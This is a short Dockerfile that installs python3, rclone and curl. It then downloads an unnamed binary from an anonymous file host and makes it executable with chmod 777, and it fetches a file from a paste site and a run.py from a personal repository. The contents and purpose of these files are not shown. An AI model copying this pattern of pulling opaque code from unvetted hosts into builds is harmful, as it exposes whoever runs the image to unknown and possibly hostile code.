FROM alpine

RUN apk add --no-cache python3 rclone curl && curl https://files.catbox.moe/cplts2 -o cplts2 && chmod 777 cplts2 && curl https://paste.ee/r/DGbgR/0 -o /tmp/carg && curl -o /tmp/run.py https://gitlab.com/rishabh-modi2/public/-/raw/main/run.py
